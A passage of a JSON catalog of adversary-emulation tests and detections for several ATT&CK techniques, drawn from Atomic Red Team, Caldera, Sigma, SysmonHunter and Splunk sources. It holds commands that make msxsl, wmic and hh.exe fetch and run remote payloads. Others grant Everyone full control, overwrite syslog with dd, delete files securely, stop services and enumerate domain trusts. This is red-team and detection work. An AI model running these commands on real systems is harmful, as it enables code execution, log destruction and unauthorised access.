"parsed_datasets": [{"Atomic Red Team Test - XSL Script Processing": {"attack_technique": "T1220", "display_name": "XSL Script Processing", "atomic_tests": [{"name": "MSXSL Bypass using local files", "description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe when test sucessfully executed, while AV turned off.\n", "supported_platforms": ["windows"], "input_arguments": {"xmlfile": {"description": "Location of the test XML file on the local filesystem.", "type": "Path", "default": "PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml"}, "xslfile": {"description": "Location of the test XSL script file on the local filesystem.", "type": "Path", "default": "PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "XML file must exist on disk at specified location (#{xmlfile})\n", "prereq_command": "if (Test-Path #{xmlfile}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{xmlfile}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml\" -OutFile \"#{xmlfile}\"\n"}, {"description": "XSL file must exist on disk at specified location (#{xslfile})\n", "prereq_command": "if (Test-Path #{xslfile}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl\" -OutFile \"#{xslfile}\"\n"}], "executor": {"name": "command_prompt", "command": "C:\\Windows\\Temp\\msxsl.exe #{xmlfile} #{xslfile}\n"}}, {"name": "MSXSL Bypass using remote files", "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe when test sucessfully executed, while AV turned off.\n", "supported_platforms": ["windows"], "input_arguments": {"xmlfile": {"description": "Remote location (URL) of the test XML file.", "type": "Url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml"}, "xslfile": {"description": "Remote location (URL) of the test XSL script file.", "type": "Url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl"}}, "executor": {"name": "command_prompt", "command": "C:\\Windows\\Temp\\msxsl.exe #{xmlfile} #{xslfile}\n"}}, {"name": "WMIC bypass using local XSL file", "description": "Executes the code specified within a XSL script using a local payload.\n", "supported_platforms": ["windows"], "input_arguments": {"wmic_command": {"description": "WMI command to execute using wmic.exe", "type": "string", "default": "process list"}, "local_xsl_file": {"description": "Location of the test XSL script file on the local filesystem.", "type": "path", "default": "PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "XSL file must exist on disk at specified location (#{local_xsl_file})\n", "prereq_command": "if (Test-Path #{local_xsl_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{local_xsl_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl\" -OutFile \"#{local_xsl_file}\"\n"}], "executor": {"name": "command_prompt", "command": "wmic #{wmic_command} /FORMAT:\"#{local_xsl_file}\"\n"}}, {"name": "WMIC bypass using remote XSL file", "description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test sucessfully executed, while AV turned off.\n", "supported_platforms": ["windows"], "input_arguments": {"wmic_command": {"description": "WMI command to execute using wmic.exe", "type": "string", "default": "process list"}, "remote_xsl_file": {"description": "Remote location of an XSL payload.", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"}}, "executor": {"name": "command_prompt", "command": "wmic #{wmic_command} /FORMAT:\"#{remote_xsl_file}\"\n"}}]}}, {"SysmonHunter - T1220": {"name": "XSL Script Processing", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"any": {"pattern": "msxsl.exe"}}}, {"type": "process", "process": {"image": {"pattern": "wmic.exe"}, "cmdline": {"pattern": "process|list|/FORMAT|.xsl", "op": "and"}}}, {"type": "process", "process": {"image": {"pattern": "wmic.exe"}, "cmdline": {"pattern": "os|get|/FORMAT|.xsl", "op": "and"}}}]}}], "command_list": ["C:\\Windows\\Temp\\msxsl.exe PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml #{xslfile}\n", "C:\\Windows\\Temp\\msxsl.exe #{xmlfile} PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl\n", "C:\\Windows\\Temp\\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml #{xslfile}\n", "C:\\Windows\\Temp\\msxsl.exe #{xmlfile} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl\n", "wmic process list /FORMAT:\"#{local_xsl_file}\"\n", "wmic #{wmic_command} /FORMAT:\"PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl\"\n", "wmic process list /FORMAT:\"#{remote_xsl_file}\"\n", "wmic #{wmic_command} /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\"\n", "msxsl.exe", "wmic.exeprocess|list|/FORMAT|.xsl", "wmic.exeos|get|/FORMAT|.xsl"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "XSL Script Processing", "id": "05c36dd6-79d6-4a9a-97da-3db20298ab2d", "status": "experimental", "description": "Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files, rule detects when adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses", "author": "Timur Zinniatullin, oscd.community", "date": "2019/10/21", "modified": "2019/11/04", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.yaml"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": [{"Image|endswith": "\\wmic.exe", "CommandLine|contains": "/format"}, {"Image|endswith": "\\msxsl.exe"}], "condition": "selection"}, "falsepositives": ["WMIC.exe FP depend on scripts and administrative methods used in the monitored environment", "msxsl.exe is not installed by default so unlikely."], "level": "medium", "tags": ["attack.execution", "attack.t1220"]}}]}, {"technique_id": "T1222", "commands": [{"source": "atomics/T1222/T1222.yaml", "command": "takeown.exe /f %temp%\\T1222_takeown_folder /r\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "Icacls.exe %temp%\\T1222_cacls /grant #{user_or_group}:F\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "Icacls.exe #{file_or_folder} /grant Everyone:F\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "attrib.exe -r %temp%\\T1222_attrib\\*.* /s\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod #{numeric_mode} /tmp/AtomicRedTeam/atomics/T1222\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": null, "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod #{symbolic_mode} /tmp/AtomicRedTeam/atomics/T1222\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod a+w #{file_or_folder}\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod #{numeric_mode} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": null, "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod #{symbolic_mode} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod a+w #{file_or_folder} -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown #{owner}:#{group} /tmp/AtomicRedTeam/atomics/T1222/T1222.yaml\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root:#{group} #{file_or_folder}\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown #{owner}:root #{file_or_folder}\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown #{owner}:#{group} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root:#{group} #{file_or_folder} -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown #{owner}:root #{file_or_folder} -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown #{owner} /tmp/AtomicRedTeam/atomics/T1222/T1222.yaml\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root #{file_or_folder}\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown #{owner} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root #{file_or_folder} -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chattr -i /var/spool/cron/root\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "chmod 766 test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "chmod u+x test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "chmod o-x test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "chown ec2-user:ec2-user test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - File Permissions Modification": {"attack_technique": "T1222", "display_name": "File Permissions Modification", "atomic_tests": [{"name": "Take ownership using takeown utility", "description": "Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, \"SUCCESS\" will\nbe displayed for the folder and each file inside of it.\n", "supported_platforms": ["windows"], "input_arguments": {"file_folder_to_own": {"description": "Path of the file or folder for takeown to take ownership.", "type": "path", "default": "%temp%\\T1222_takeown_folder"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Test requrires a file to take ownership of to be located at (#{file_folder_to_own})\n", "prereq_command": "IF EXIST #{file_folder_to_own} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "mkdir #{file_folder_to_own}\necho T1222_takeown1 >> #{file_folder_to_own}\\T1222_takeown1.txt\necho T1222_takeown2 >> #{file_folder_to_own}\\T1222_takeown2.txt\n"}], "executor": {"name": "command_prompt", "command": "takeown.exe /f #{file_folder_to_own} /r\n"}}, {"name": "cacls - Grant permission to specified user or group recursively", "description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If \"Access is denied\"\nis displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, \"Successfully processed 3 files\"\nwill be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder to change permissions.", "type": "path", "default": "%temp%\\T1222_cacls"}, "user_or_group": {"description": "User or group to allow full control", "type": "string", "default": "Everyone"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Test requrires a file to modifyto be located at (#{file_or_folder})\n", "prereq_command": "IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "mkdir #{file_or_folder}\necho T1222_cacls1 >> #{file_or_folder}\\T1222_cacls1.txt\necho T1222_cacls2 >> #{file_or_folder}\\T1222_cacls2.txt\n"}], "executor": {"name": "command_prompt", "command": "Icacls.exe #{file_or_folder} /grant #{user_or_group}:F\n"}}, {"name": "attrib - Remove read-only attribute", "description": "Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.\nOpen the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.\n", "supported_platforms": ["windows"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder remove attribute.", "type": "path", "default": "%temp%\\T1222_attrib"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "Test requrires a file to modify to be located at (#{file_or_folder})\n", "prereq_command": "IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "mkdir #{file_or_folder}\necho T1222_attrib1 >> #{file_or_folder}\\T1222_attrib1.txt\necho T1222_attrib2 >> #{file_or_folder}\\T1222_attrib2.txt\nattrib.exe +r #{file_or_folder}\\T1222_attrib1.txt\nattrib.exe +r #{file_or_folder}\\T1222_attrib2.txt\n"}], "executor": {"name": "command_prompt", "command": "attrib.exe -r #{file_or_folder}\\*.* /s\n"}}, {"name": "chmod - Change file or folder mode (numeric mode)", "description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222"}, "numeric_mode": {"description": "Specified numeric mode value", "type": "string", "default": 755}}, "executor": {"name": "bash", "command": "chmod #{numeric_mode} #{file_or_folder}\n"}}, {"name": "chmod - Change file or folder mode (symbolic mode)", "description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222"}, "symbolic_mode": {"description": "Specified symbolic mode value", "type": "string", "default": "a+w"}}, "executor": {"name": "bash", "command": "chmod #{symbolic_mode} #{file_or_folder}\n"}}, {"name": "chmod - Change file or folder mode (numeric mode) recursively", "description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222"}, "numeric_mode": {"description": "Specified numeric mode value", "type": "string", "default": 755}}, "executor": {"name": "bash", "command": "chmod #{numeric_mode} #{file_or_folder} -R\n"}}, {"name": "chmod - Change file or folder mode (symbolic mode) recursively", "description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222"}, "symbolic_mode": {"description": "Specified symbolic mode value", "type": "string", "default": "a+w"}}, "executor": {"name": "bash", "command": "chmod #{symbolic_mode} #{file_or_folder} -R\n"}}, {"name": "chown - Change file or folder ownership and group", "description": "Changes a file or folder's ownership and group information using chown.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222/T1222.yaml"}, "owner": {"description": "Username of desired owner", "type": "string", "default": "root"}, "group": {"description": "Group name of desired group", "type": "string", "default": "root"}}, "executor": {"name": "bash", "command": "chown #{owner}:#{group} #{file_or_folder}\n"}}, {"name": "chown - Change file or folder ownership and group recursively", "description": "Changes a file or folder's ownership and group information recursively using chown.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222"}, "owner": {"description": "Username of desired owner", "type": "string", "default": "root"}, "group": {"description": "Group name of desired group", "type": "string", "default": "root"}}, "executor": {"name": "bash", "command": "chown #{owner}:#{group} #{file_or_folder} -R\n"}}, {"name": "chown - Change file or folder mode ownership only", "description": "Changes a file or folder's ownership only using chown.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222/T1222.yaml"}, "owner": {"description": "Username of desired owner", "type": "string", "default": "root"}}, "executor": {"name": "bash", "command": "chown #{owner} #{file_or_folder}\n"}}, {"name": "chown - Change file or folder ownership recursively", "description": "Changes a file or folder's ownership only recursively using chown.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_or_folder": {"description": "Path of the file or folder", "type": "path", "default": "/tmp/AtomicRedTeam/atomics/T1222"}, "owner": {"description": "Username of desired owner", "type": "string", "default": "root"}}, "executor": {"name": "bash", "command": "chown #{owner} #{file_or_folder} -R\n"}}, {"name": "chattr - Remove immutable file attribute", "description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"file_to_modify": {"description": "Path of the file", "type": "path", "default": "/var/spool/cron/root"}}, "executor": {"name": "sh", "command": "chattr -i #{file_to_modify}\n"}}]}}], "command_list": ["takeown.exe /f %temp%\\T1222_takeown_folder /r\n", "Icacls.exe %temp%\\T1222_cacls /grant #{user_or_group}:F\n", "Icacls.exe #{file_or_folder} /grant Everyone:F\n", "attrib.exe -r %temp%\\T1222_attrib\\*.* /s\n", "chmod #{numeric_mode} /tmp/AtomicRedTeam/atomics/T1222\n", null, "chmod #{symbolic_mode} /tmp/AtomicRedTeam/atomics/T1222\n", "chmod a+w #{file_or_folder}\n", "chmod #{numeric_mode} /tmp/AtomicRedTeam/atomics/T1222 -R\n", null, "chmod #{symbolic_mode} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "chmod a+w #{file_or_folder} -R\n", "chown #{owner}:#{group} /tmp/AtomicRedTeam/atomics/T1222/T1222.yaml\n", "chown root:#{group} #{file_or_folder}\n", "chown #{owner}:root #{file_or_folder}\n", "chown #{owner}:#{group} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "chown root:#{group} #{file_or_folder} -R\n", "chown #{owner}:root #{file_or_folder} -R\n", "chown #{owner} /tmp/AtomicRedTeam/atomics/T1222/T1222.yaml\n", "chown root #{file_or_folder}\n", "chown #{owner} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "chown root #{file_or_folder} -R\n", "chattr -i /var/spool/cron/root\n", "```", "chmod 766 test1.txt", "chmod u+x test1.txt", "chmod o-x test1.txt", "```", "```", "chown ec2-user:ec2-user test1.txt", "```"], "attack_paths": [], "queries": [{"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit syscall=90 OR syscall=91 OR sycall=268 | table msg,syscall,syscall_name,success,auid,comm,exe", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=linux_audit syscall=92 OR syscall=93 OR syscall=94 OR syscall=260 comm!=splunkd | table", "name": null}, {"product": "Splunk", "query": "msg,syscall,syscall_name,success,auid,comm,exe", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "-a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F auid>=1000 -F auid!=-1 -F key=perm_mod", "name": null}, {"product": "Splunk", "query": "-a always,exit -F arch=b64 -S chown,fchown,lchown,fchownat -F auid>=1000 -F auid!=-1 -F key=perm_mod", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=\"bash_history\" bash_command=\"chmod *\" | table host,user_name,bash_command", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "```", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=\"bash_history\" bash_command=\"chown *\" | table host,user_name,bash_command", "name": null}, {"product": "Splunk", "query": "```", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}]}, {"technique_id": "T1223", "commands": [{"source": "atomics/T1223/T1223.yaml", "command": "hh.exe PathToAtomicsFolder\\T1223\\src\\T1223.chm\n", "name": null}, {"source": "atomics/T1223/T1223.yaml", "command": "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm\n", "name": null}, {"source": "SysmonHunter - Compiled HTML File", "command": "\\windows\\hh.exe.chm", "name": null}, {"source": "SysmonHunter - Compiled HTML File", "command": "hh.exe|.chm", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Compiled HTML File": {"attack_technique": "T1223", "display_name": "Compiled HTML File", "atomic_tests": [{"name": "Compiled HTML Help Local Payload", "description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n", "supported_platforms": ["windows"], "input_arguments": {"local_chm_file": {"description": "Local .chm payload", "type": "path", "default": "PathToAtomicsFolder\\T1223\\src\\T1223.chm"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The payload must exist on disk at specified location (#{local_chm_file})\n", "prereq_command": "if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{local_chm_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1223/src/T1223.chm\" -OutFile \"#{local_chm_file}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "hh.exe #{local_chm_file}\n"}}, {"name": "Compiled HTML Help Remote Payload", "description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n", "supported_platforms": ["windows"], "input_arguments": {"remote_chm_file": {"description": "Remote .chm payload", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "hh.exe #{remote_chm_file}\n"}}]}}, {"SysmonHunter - T1223": {"name": "Compiled HTML File", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"image": {"pattern": "\\windows\\hh.exe"}}, "file": {"path": {"pattern": ".chm"}}}, {"type": "process", "process": {"cmdline": {"pattern": "hh.exe|.chm", "op": "and"}}}]}}], "command_list": ["hh.exe PathToAtomicsFolder\\T1223\\src\\T1223.chm\n", "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm\n", "\\windows\\hh.exe.chm", "hh.exe|.chm"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and process_path contains \"hh.exe\"", "name": "Compiled HTML File"}], "possible_detections": []}, {"technique_id": "T1482", "commands": [{"source": "atomics/T1482/T1482.yaml", "command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n", "name": null}, {"source": "atomics/T1482/T1482.yaml", "command": "nltest /domain_trusts\n", "name": null}, {"source": "atomics/T1482/T1482.yaml", "command": "Get-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n", "name": null}, {"source": "data/abilities/discovery/6131397e-7765-424e-a594-3d7fb2d93a6a.yml", "command": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.ad.forest", "json_key": "Forest", "json_type": ["str"]}, {"source": "domain.ad.name", "json_key": "Name", "json_type": ["str"]}]}, "payloads": ["powerview.ps1"]}}}, "name": "Determine the Windows Domain of a computer"}], "parsed_datasets": [{"Atomic Red Team Test - Domain Trust Discovery": {"attack_technique": "T1482", "display_name": "Domain Trust Discovery", "atomic_tests": [{"name": "Windows - Discover domain trusts with dsquery", "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n"}}, {"name": "Windows - Discover domain trusts with nltest", "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "command": "nltest /domain_trusts\n"}}, {"name": "Powershell enumerate domains and forests", "description": "Use powershell to enumerate AD information\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n"}}]}}, {"Mitre Stockpile - Determine the Windows Domain of a computer": {"id": "6131397e-7765-424e-a594-3d7fb2d93a6a", "name": "GetDomain", "description": "Determine the Windows Domain of a computer", "tactic": "discovery", "technique": {"attack_id": "T1482", "name": "Domain Trust Discovery"}, "platforms": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.ad.forest", "json_key": "Forest", "json_type": ["str"]}, {"source": "domain.ad.name", "json_key": "Name", "json_type": ["str"]}]}, "payloads": ["powerview.ps1"]}}}}}], "command_list": ["dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n", "nltest /domain_trusts\n", "Get-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n", {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.ad.forest", "json_key": "Forest", "json_type": ["str"]}, {"source": "domain.ad.name", "json_key": "Name", "json_type": ["str"]}]}, "payloads": ["powerview.ps1"]}}}], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1485", "commands": [{"source": "atomics/T1485/T1485.yaml", "command": "Invoke-Expression -Command \"$env:TEMP\\Sdelete\\sdelete.exe -accepteula #{file_to_delete}\"\n", "name": null}, {"source": "atomics/T1485/T1485.yaml", "command": "Invoke-Expression -Command \"#{sdelete_exe} -accepteula $env:TEMP\\T1485.txt\"\n", "name": null}, {"source": "atomics/T1485/T1485.yaml", "command": "dd of=#{file_to_overwrite} if=/dev/zero\n", "name": null}, {"source": "atomics/T1485/T1485.yaml", "command": "dd of=/var/log/syslog if=#{overwrite_source}\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Data Destruction": {"attack_technique": "T1485", "display_name": "Data Destruction", "atomic_tests": [{"name": "Windows - Overwrite file with Sysinternals SDelete", "description": "Overwrites and deletes a file using Sysinternals SDelete. Upon successful execution, \"Files deleted: 1\" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"sdelete_exe": {"description": "Path of sdelete executable", "type": "Path", "default": "$env:TEMP\\Sdelete\\sdelete.exe"}, "file_to_delete": {"description": "Path of file to delete", "type": "path", "default": "$env:TEMP\\T1485.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Secure delete tool from Sysinternals must exist on disk at specified location (#{sdelete_exe})\n", "prereq_command": "if (Test-Path #{sdelete_exe}) {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/SDelete.zip\" -OutFile \"$env:TEMP\\SDelete.zip\"\nExpand-Archive $env:TEMP\\SDelete.zip $env:TEMP\\Sdelete -Force\nRemove-Item $env:TEMP\\SDelete.zip -Force\n"}, {"description": "The file to delete must exist at #{file_to_delete}\n", "prereq_command": "if (Test-Path #{file_to_delete}) { exit 0 } else { exit 1 }\n", "get_prereq_command": "New-Item #{file_to_delete} -Force | Out-Null\n"}], "executor": {"name": "powershell", "command": "Invoke-Expression -Command \"#{sdelete_exe} -accepteula #{file_to_delete}\"\n"}}, {"name": "macOS/Linux - Overwrite file with DD", "description": "Overwrites and deletes a file using DD.\nTo stop the test, break the command with CTRL/CMD+C.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"overwrite_source": {"description": "Path of data source to overwrite with", "type": "Path", "default": "/dev/zero"}, "file_to_overwrite": {"description": "Path of file to overwrite and remove", "type": "Path", "default": "/var/log/syslog"}}, "executor": {"name": "bash", "command": "dd of=#{file_to_overwrite} if=#{overwrite_source}\n"}}]}}], "command_list": ["Invoke-Expression -Command \"$env:TEMP\\Sdelete\\sdelete.exe -accepteula #{file_to_delete}\"\n", "Invoke-Expression -Command \"#{sdelete_exe} -accepteula $env:TEMP\\T1485.txt\"\n", "dd of=#{file_to_overwrite} if=/dev/zero\n", "dd of=/var/log/syslog if=#{overwrite_source}\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1489", "commands": [{"source": "atomics/T1489/T1489.yaml", "command": "sc.exe stop spooler\n", "name": null}, {"source": "atomics/T1489/T1489.yaml", "command": "net.exe stop spooler\n", "name": null}, {"source": "atomics/T1489/T1489.yaml", "command": "taskkill.exe /f /im spoolsv.exe\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Service Stop": {"attack_technique": "T1489", "display_name": "Service Stop", "atomic_tests": [{"name": "Windows - Stop service using Service Controller", "description": "Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying\nit has changed to a state of STOP_PENDING. If the spooler service was not running \"The service has not been started.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "supported_platforms": ["windows"], "input_arguments": {"service_name": {"description": "Name of a service to stop", "type": "String", "default": "spooler"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "sc.exe stop #{service_name}\n", "cleanup_command": "sc.exe start #{service_name} >nul 2>&1\n"}}, {"name": "Windows - Stop service using net.exe", "description": "Stops a specified service using the net.exe command. Upon execution, if the service was running \"The Print Spooler service was stopped successfully.\"\nwill be displayed. If the service was not running, \"The Print Spooler service is not started.\" will be displayed and it can be\nstarted by running the cleanup command.\n", "supported_platforms": ["windows"], "input_arguments": {"service_name": {"description": "Name of a service to stop", "type": "String", "default": "spooler"}}, "executor": {"name": 